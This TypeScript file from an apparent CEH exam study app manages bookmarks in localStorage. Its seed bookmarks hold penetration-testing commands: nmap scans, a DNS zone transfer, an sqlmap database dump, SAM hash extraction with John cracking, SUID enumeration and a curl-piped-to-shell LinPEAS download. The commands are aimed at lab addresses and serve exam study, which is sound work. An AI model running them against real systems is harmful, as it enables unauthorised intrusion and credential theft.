/**
 * @license
 * SPDX-License-Identifier: Apache-2.0
 */

import { StudyBookmark } from '../types';
import { STORAGE_KEYS } from '../data/appConfig';

/**
 * Curated high-yield starter bookmarks for rapid CEH v13 review
 */
export const STARTER_BOOKMARKS: StudyBookmark[] = [
  {
    id: 'note-mr-infect',
    type: 'note',
    title: 'Mr-Infect CEH v13 Complete Markdown Notes',
    category: 'Written Notes',
    sourceTab: 'written',
    sourceSubTab: 'notes',
    targetId: 'mr-infect',
    description: 'Comprehensive domain-by-domain cheat sheet synthesizing all 9 CEH exam blueprint domains with port lists, packet structures, and mitigation matrices.',
    content: `# CEH v13 Markdown Snapshot
- Domain 1: Information Security & Ethical Hacking Overview (6%)
- Domain 2: Reconnaissance & Footprinting (21%)
  - Google Dorking: site:, inurl:, filetype:pdf, intitle:"index of"
  - DNS Zone Transfer: dig axfr @ns1.target.com target.com
- Domain 3: Scanning Networks (17%)
  - TCP SYN Scan: nmap -sS -Pn -p- -T4 <target>`,
    tags: ['Reconnaissance', 'DNS', 'Nmap', 'Footprinting'],
    createdAt: new Date().toISOString()
  },
  {
    id: 'cmd-nmap-full-recon',
    type: 'command',
    title: 'Nmap Multi-Vector Stealth & Service Audit',
    category: 'Essential Command',
    sourceTab: 'practical',
    sourceSubTab: 'pillars',
    targetId: 'pillar-1',
    description: 'Gold standard scanning string: aggressive version detection, default NSE vulnerability scripts, OS fingerprinting with min-rate optimization.',
    content: 'nmap -sS -sV -sC -O -T4 --min-rate 1000 -p- -oN nmap_full_audit.txt 10.10.10.X',
    notes: '-sS (SYN stealth), -sV (service versions), -sC (default NSE), -O (OS detection), -T4 (timing aggressive)',
    tags: ['Nmap', 'Port Scanning', 'OS Fingerprinting'],
    createdAt: new Date().toISOString()
  },
  {
    id: 'cheatsheet-linpeas-privesc',
    type: 'cheatsheet',
    title: 'LinPEAS & SUID Privilege Escalation Workflow',
    category: 'Practical Cheat Sheet',
    sourceTab: 'practical',
    sourceSubTab: 'big-three',
    targetId: 'repo-1',
    description: 'Automated post-exploitation script to discover SUID binaries, writable /etc/passwd or /etc/shadow, sudo privileges without password, and kernel exploits.',
    content: `# 1. Discover SUID binaries with root permissions
find / -perm -u=s -type f 2>/dev/null

# 2. Check sudo privileges
sudo -l

# 3. Automated enumeration
curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh`,
    notes: 'Prioritize binaries listed on GTFOBins (e.g. find, vim, python, bash, cp, awk).',
    tags: ['Privilege Escalation', 'Linux', 'SUID', 'GTFOBins'],
    createdAt: new Date().toISOString()
  },
  {
    id: 'cmd-sqlmap-batch-dump',
    type: 'command',
    title: 'SQLMap Complete Automated Database Extraction',
    category: 'Essential Command',
    sourceTab: 'practical',
    sourceSubTab: 'pillars',
    targetId: 'pillar-2',
    description: 'Automated blind and error-based SQL injection exploitation targeting input parameters with full database enumeration and table dumping.',
    content: 'sqlmap -u "http://10.10.10.X/gallery.php?id=1" --batch --dbs --tables --dump',
    notes: '--batch (non-interactive default answers), --dbs (enumerate DBs), --dump (dump data contents)',
    tags: ['Web Exploitation', 'SQL Injection', 'SQLMap'],
    createdAt: new Date().toISOString()
  },
  {
    id: 'pillar-3-system-hacking',
    type: 'pillar',
    title: 'Pillar 3: System Hacking & Hash Cracking',
    category: '4 Practical Pillars',
    sourceTab: 'practical',
    sourceSubTab: 'pillars',
    targetId: 'pillar-3',
    description: 'Capturing and cracking Windows NTLM hashes, privilege escalation vectors, VeraCrypt hidden volumes, and John the Ripper / Hashcat wordlists.',
    content: `# Extract and crack Windows SAM hashes
samdump2 SYSTEM SAM > hashes.txt
john --format=NT --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt`,
    notes: 'Accounts for ~25% of the practical exam flags.',
    tags: ['Password Cracking', 'NTLM', 'John the Ripper', 'System Hacking'],
    createdAt: new Date().toISOString()
  }
];

/**
 * Retrieve all saved bookmarks from localStorage
 */
export function getBookmarks(): StudyBookmark[] {
  try {
    const raw = localStorage.getItem(STORAGE_KEYS.BOOKMARKS);
    if (!raw) {
      // Seed with curated starter bookmarks on first initialization
      localStorage.setItem(STORAGE_KEYS.BOOKMARKS, JSON.stringify(STARTER_BOOKMARKS));
      return STARTER_BOOKMARKS;
    }
    const parsed = JSON.parse(raw);
    return Array.isArray(parsed) ? parsed : [];
  } catch (err) {
    console.error('Failed to load bookmarks from storage:', err);
    return [];
  }
}

/**
 * Check if an item is currently bookmarked
 */
export function isBookmarked(id: string): boolean {
  const bookmarks = getBookmarks();
  return bookmarks.some((b) => b.id === id);
}

/**
 * Notify all subscribed views and components that bookmarks have updated
 */
function dispatchBookmarkUpdate(bookmarks: StudyBookmark[]) {
  window.dispatchEvent(
    new CustomEvent('bookmarks-updated', {
      detail: { count: bookmarks.length, bookmarks },
    })
  );
}

/**
 * Add a new bookmark
 */
export function addBookmark(item: StudyBookmark): void {
  const bookmarks = getBookmarks();
  if (bookmarks.some((b) => b.id === item.id)) return;
  const updated = [item, ...bookmarks];
  try {
    localStorage.setItem(STORAGE_KEYS.BOOKMARKS, JSON.stringify(updated));
    dispatchBookmarkUpdate(updated);
  } catch (err) {
    console.error('Failed to save bookmark:', err);
  }
}

/**
 * Remove an existing bookmark by ID
 */
export function removeBookmark(id: string): void {
  const bookmarks = getBookmarks();
  const updated = bookmarks.filter((b) => b.id !== id);
  try {
    localStorage.setItem(STORAGE_KEYS.BOOKMARKS, JSON.stringify(updated));
    dispatchBookmarkUpdate(updated);
  } catch (err) {
    console.error('Failed to remove bookmark:', err);
  }
}

/**
 * Toggle bookmark state for an item. Returns true if newly bookmarked, false if unbookmarked.
 */
export function toggleBookmark(item: StudyBookmark): boolean {
  if (isBookmarked(item.id)) {
    removeBookmark(item.id);
    return false;
  } else {
    addBookmark(item);
    return true;
  }
}

/**
 * Clear all saved bookmarks
 */
export function clearAllBookmarks(): void {
  try {
    localStorage.setItem(STORAGE_KEYS.BOOKMARKS, JSON.stringify([]));
    dispatchBookmarkUpdate([]);
  } catch (err) {
    console.error('Failed to clear bookmarks:', err);
  }
}

/**
 * Reset bookmarks back to default curated starter set
 */
export function restoreStarterBookmarks(): void {
  try {
    localStorage.setItem(STORAGE_KEYS.BOOKMARKS, JSON.stringify(STARTER_BOOKMARKS));
    dispatchBookmarkUpdate(STARTER_BOOKMARKS);
  } catch (err) {
    console.error('Failed to restore starter bookmarks:', err);
  }
}

/**
 * Export bookmarks formatted as Markdown document
 */
export function exportBookmarksAsMarkdown(): string {
  const bookmarks = getBookmarks();
  let md = `# KayBiT CEH Exam Hub — My Saved Bookmarks\n\n`;
  md += `Exported on: ${new Date().toLocaleString()}\n`;
  md += `Total Items: ${bookmarks.length}\n\n`;
  md += `---\n\n`;

  bookmarks.forEach((b, idx) => {
    md += `## ${idx + 1}. [${b.category.toUpperCase()}] ${b.title}\n`;
    md += `- **Type**: ${b.type}\n`;
    md += `- **Source Tab**: ${b.sourceTab}${b.sourceSubTab ? ` > ${b.sourceSubTab}` : ''}\n`;
    if (b.tags && b.tags.length > 0) {
      md += `- **Tags**: ${b.tags.map((t) => `\`${t}\``).join(', ')}\n`;
    }
    if (b.description) {
      md += `- **Summary**: ${b.description}\n`;
    }
    if (b.content) {
      md += `\n\`\`\`bash\n${b.content}\n\`\`\`\n`;
    }
    if (b.notes) {
      md += `\n> **Exam Notes**: ${b.notes}\n`;
    }
    md += `\n---\n\n`;
  });

  return md;
}

/**
 * Export bookmarks formatted as JSON string
 */
export function exportBookmarksAsJson(): string {
  const bookmarks = getBookmarks();
  return JSON.stringify(bookmarks, null, 2);
}
